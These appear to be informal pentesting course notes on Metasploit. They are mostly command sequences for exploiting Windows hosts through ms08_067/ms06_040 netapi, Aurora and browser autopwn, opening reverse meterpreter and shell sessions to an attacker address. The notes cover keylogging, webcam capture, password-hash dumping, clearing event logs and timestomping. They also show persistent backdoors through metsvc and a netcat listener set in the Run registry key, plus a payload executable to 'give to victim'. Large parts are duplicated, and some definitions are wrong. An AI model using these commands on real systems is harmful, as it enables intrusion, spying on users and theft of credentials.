							METASPLOIT


Vulnerability  :   A weakness that allows an attacker to compromise the secrity of system.
Exploits         :   Doing the step by step procedure of gathering information
Payload          :   the process to gain access which is blocked by user
Encoders       :   The process to remove tracks.


Need for metasploit:- 

1] difficult to manage,update,customize dozen of exploits available on internet for differnet technologies
2]custmoization of exploits will be time consuming & one also need high skills do to same
					

METASPLOIT

Teesting framework for Penetration testing contains 700+exploit


http://cve.mitre.org

commands
1] Open Terminal and type : msfconsole
	root@bt# msfconsole


1 msf>search exploits
2 msf>use exploit path
3 msf>set exploit path
4 msf>show options
5 msf>show exploit

roobt@bt#>ifconfig(our ipadrees bt )									winxp:
									CMD>ipconfig- victim
5 msf>set rhost xp ip
6 msf> show options
7 msf> show payloads
8 msf> set payload path
9 msf>show option
10 msf> set lhost bt ip					bt= backtrack
11 msf>show options
12 msf>exploit

we got C:/windows:



2]MEterpreter payload

meterpreter sends file in cryted file

step1] msf>show exploits
step2] msf> use exploit path
step3] msf>set exploit path
step4] msf>show options
step5]msf> set rhost xp ip
step6] msf> show option
step7] msf> show payloads
step8] msf> set payload windows/meterpreter/reverse_tcp 
step9] show option
step10] msf> set lhost backtrack ip
step11] msf> show option
step12] msf> exploit


step 	1[ meterpreter> background
     	2] meterpreter>show options
     	3] meterpreter>exploit
     	4] meterpreter>sessions-i 1
      	5] meterpreter>getuid
	6] meterpreter>getsystem
	7] meterpreter>ps
	8] meterpreter>getpid
	9] meterpreter>migrate
	8]lpwd(Print Local working directory)
	9] pwd
	10] screenshot
	11] getdesktop
	12] keyscan_start {keylogger start}
	13] keyscan_dump {get what frnd is typing}
	14] keyscan_stop  {keylogger stop}
	15] webcame_list	list of webcam
	16] webcam_snap             (webcam gives snap_
	17] hashdump


-----------------------------------------------------------> C:/windows/System>SAM FILE OPH crack {converts hashes}

	18]meterpreter>run scraper
	19]meterpreter>mkdir
	20]meterpreter>edit path
	21]meterpreter> delete path
	22] meterpreter>upload backtrack_path winxp_path
	23] meterpreter>cd c:/	
	24] meterpreter>clearev
	25]meterpreter>timestomp
	26]MACE- modified Accesed Created Entry
	27]meterpreter>timestomp C:/sunny.txt -"10/10/12"
	28]meterpreter>run metsvc (For creating backdoor)
______________________________________________________________________________________________________
							ARORA Exploit
	
msf>use exploit/windows/browser/ms10_002_aurora
msf>show options
msf>set URLPATH/
http://192.168.42.131/
msf>show payloads
msf>set payload  windows/vncinject/reverse_tcp 
vnc.exe
msf>show options
msf>set lhost 192.168.17.128 
msf>exploit	
______________________________________________________________________________________________________
							WINDOWS 7 exploitation

start terminal/
root@bt:~#
msfpayload windows/meterpreter/reverse_tcp Lhost=192.168.17.128 LPORT=4444 x > /root/12345.exe
msf> use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > show options


ARMYTAGE ---------------> for direct no commands usage needs

_________________________________________________________________________________________________________
						Multi/handler [Exploit]
msf>use exploit/multi/handler
msf>set payload windows/metsvc_bind_tcp
msf>show options
msf>set RHOST 192.168.17.127
msf>exploit

_________________________________________________________________________________________________________
						Netapi

root@bt# msfconsole
msf>show exploits
msf>search netapi(or name of exploits which is depend on target computer os)
msf>use exploit/windows/smb/ms08_067_netapi (address ofexploits)
msf>set RHOST 192.168.132.29(ip address of victim or target)
msf>show options
msf>show payloads
msf>set payloads windows/shell/reverse_tcp(name of payloads)
msf>setLHOST 192.168.132.131(attacker ip address)
msf>show options(if everything is ready then attack)
msf>exploits

####################################################################################
#######################		Pentesting 1		##############################
####################################################################################

Types Of Testing :

1] White-Box Testing :
2] Black-Box Testing :
3] Grey-Box Testing :
4] Known Testing : 
5] Unknown Testing :
6] Internal Testing : Within a company
7] External Testing : Outside the company

Process Of Pentesting :

1] Footprinting/Scanning
2] Gaining Access


Tools :

1] Metasploit [ msfconnsole,msfupdate,]
2] Core-impact



					METASPLOIT


Vulnerability  :   A weakness that allows an attacker to compromise the secrity of system.
Exploits         :   Doing the step by step procedure of gathering information
Payload          :   the process to gain access which is blocked by user
Encoders       :   The process to remove tracks.


Need for metasploit:- 

1] difficult to manage,update,customize dozen of exploits available on internet for differnet technologies
2]custmoization of exploits will be time consuming & one also need high skills do to same
					

METASPLOIT :-

Testing framework for Penetration testing contains 700+exploit


http://cve.mitre.org

commands
1] Open Terminal and type : msfconsole
	root@bt# msfconsole


1 msf>search exploits
2 msf>use exploit path
3 msf>set exploit path
4 msf>show options
5 msf>show exploit

roobt@bt#>ifconfig(our ipadrees bt )			winxp:
						CMD>ipconfig- victim
5 msf>set rhost xp ip
6 msf> show options
7 msf> show payloads
8 msf> set payload path
9 msf>show option
10 msf> set lhost bt ip				bt= backtrack
11 msf>show options
12 msf>exploit

we got C:/windows:



2]MEterpreter payload

meterpreter sends file in cryted file

step1] msf>show exploits
step2] msf> use exploit path
step3] msf>set exploit path
step4] msf>show options
step5]msf> set rhost xp ip
step6] msf> show option
step7] msf> show payloads
step8] msf> set payload windows/meterpreter/reverse_tcp 
step9] show option
step10] msf> set lhost backtrack ip
step11] msf> show option
step12] msf> exploit


step 	1[ meterpreter> background
     	2] meterpreter>show options
     	3] meterpreter>exploit
     	4] meterpreter>sessions-i 1
      	5] meterpreter>getuid
	6] meterpreter>getsystem
	7] meterpreter>ps
	8] meterpreter>getpid
	9] meterpreter>migrate
	8]lpwd(Print Local working directory)
	9] pwd
	10] screenshot
	11] getdesktop
	12] keyscan_start {keylogger start}
	13] keyscan_dump {get what frnd is typing}
	14] keyscan_stop  {keylogger stop}
	15] webcame_list	list of webcam
	16] webcam_snap             (webcam gives snap_
	17] hashdump


--------------------------------------> C:/windows/System>SAM FILE OPH crack {converts hashes}

	18]meterpreter>run scraper
	19]meterpreter>mkdir
	20]meterpreter>edit path
	21]meterpreter> delete path
	22] meterpreter>upload backtrack_path winxp_path
	23] meterpreter>cd c:/	
	24] meterpreter>clearev
	25]meterpreter>timestomp
	26]MACE- modified Accesed Created Entry
	27]meterpreter>timestomp C:/sunny.txt -"10/10/12"
	28]meterpreter>run metsvc (For creating backdoor)
_________________________________________________________________________

					ARORA Exploit
	
msf>use exploit/windows/browser/ms10_002_aurora
msf>show options
msf>set URLPATH/
http://192.168.42.131/
msf>show payloads
msf>set payload  windows/vncinject/reverse_tcp 
vnc.exe
msf>show options
msf>set lhost 192.168.17.128 
msf>exploit	
___________________________________________________________________________

					WINDOWS 7 exploitation

start terminal/
root@bt:~#
msfpayload windows/meterpreter/reverse_tcp Lhost=192.168.17.128 LPORT=4444 x > /root/12345.exe
msf> use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > show options


ARMYTAGE ---------------> for direct no commands usage needs

___________________________________________________________________________
						Multi/handler [Exploit]
msf>use exploit/multi/handler
msf>set payload windows/metsvc_bind_tcp
msf>show options
msf>set RHOST  


################################################################################################
############################		Pentesting	 2	#################################
###############################################################################################

http://whatstheirip.com/

--> Black hole Exploit kit []

Auxiliary - Pre defined task
Exploits
Payloads

Commands :
1] db_status - To see if u r online or not.
2] workspace - * for working
	> workspace -a lol ---> create workspace
	> db_nmap -T4 -A 192.168.76.130
	> hosts
	> services
		
1] Metasploit :

	> RCE ( Netapi ) ( Remote Code Exicution ) [Win XP SP-2,3]
		> msfconsole
		> search netapi
		> use exploit/windows/smb/ms08_067_netapi [ CVE NO = 067 ]
		> show options
		> set RHOST [TARGET IP]
		> set PAYLOAD windows/meterpreter/bind_tcp
			OR > set PAYLOAD windows/meterpreter/reverse_tcp [ Test other payload also ]
		> set LHOST [MY IP ADDRESS]
		> exploit
		meterpreter > getuid
		meterpreter > ps
		meterpreter > migrate 1444 [ migrate to that process which have admin privileges. ]
		meterpreter > idletime
		meterpreter > hashdump
		meterpreter > screenshot
		meterpreter > shell
				> c:\> exit
				>
> Uploading Netcat :	
		meterpreter > upload /pentest/windows-binaries/tools/nc.exe c:\\WINDOWS\\SYSTEM32\\
		meterpreter > reg enumkry -k HKLM\\software\\Microsoft\\Windows\\CurrentVersion\\Run
		meterpreter > reg setval -k HKLM\\software\\Microsoft\\Windows\\CurrentVersion\Run -v NETCAT -d C:\\WINDOWS\\system32\\nc.exe" -L -d -p 1234 -e cmd.exe"
		meterpreter > reg enumkey -k HKLM\\software\\Microsoft\\Windows\\CurrentVersion\\Run

Note : Netcat can be installed in win xp,vista,7 [ Once netcat is installed sucessfully on victim os no need to exploit use  commands :]
		root@bt:~# nc <victim ip> <port>
		root@bt:~# nc 192.168.217.141 1234
		  

> More Commands :

		meterpreter > cat <file name>
		meterpreter > download C:\\<file name>
		meterpreter > upload C:\\<file name>
		meterpreter > searrch -d  C:\\ *d
		meterpreter > keyscan_start
		meterpreter > keyscan_dump
		meterpreter > keyscan_stop
		meterpreter > uictl disable keybord
		meterpreter > uictl enable keybord
		meterpreter > run [ press tab show many more commands ]
		meterpreter > run vnc

> Creating Backdoor :

		meterpreter > run metsvc [Maximum Virus And Trojens Work On 31337 Port]
		meterpreter > background [ to go back ]

NOTE : What if our connection break or victim patch his vanul.  to connect with our "Backdoor" :-

	> use exploit/multi/handler
	> set payload/windows/metsvc_bind_tcp
	> show options
	> set rhost < victim >
	> set lport 31337 ---------> because our backdoor is working on 31337 port.
	> exploit
		meterpreter > run
		meterpreter >
 	
	> RCE ( Netapi ) ( Remote Code Exicution ) [ windows server 2003 SP-1,2,platinum ]	
		> msfconsole
		> exploit/windows/smb/ms06_040_netapi 
		> set PAYLOAD windows/meterpreter/reverse_tcp
		> set LHOST [MY IP ADDRESS]
		> set RHOST [TARGET IP]
		> exploit

	> EXE [ Exploit ]

		root@#~/ msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.17.128 LPORT=4444 x > /root/12345.exe
		NOTE : Give 12345.exe [ virus ] to victim
		> use exploit/multi/handler
		> set PAYLOAD windows/meterpreter/reverse_tcp
		> show options
		> set lhost < Our  Ip >
		> set lport 4444 ---------> because our virus is working on 4444 port
		> exploit
		meterpreter > run
	
	> Autopwn [ combo of may exploits ] [See also : Java bean jmx17_jmxbean ]
		> use auxiliary/server/browser_autopwn
		> show options
		> set LHOST <My Ip >
		> set SRVHOST < My Server is hosted on my computer so again my ip >
		> set SRVPORT 80
		> set URIPATH /
		> exploit
	

2] armitage :
	> hosts / clear database
	> host / nmap / nmap_os scan
	> attack / find attack
	> right click/smb/ms08_067_netapi
	> launch attack
	> right click/meterpreter/

Note : If u don't know which attack to perform use " hail mary "
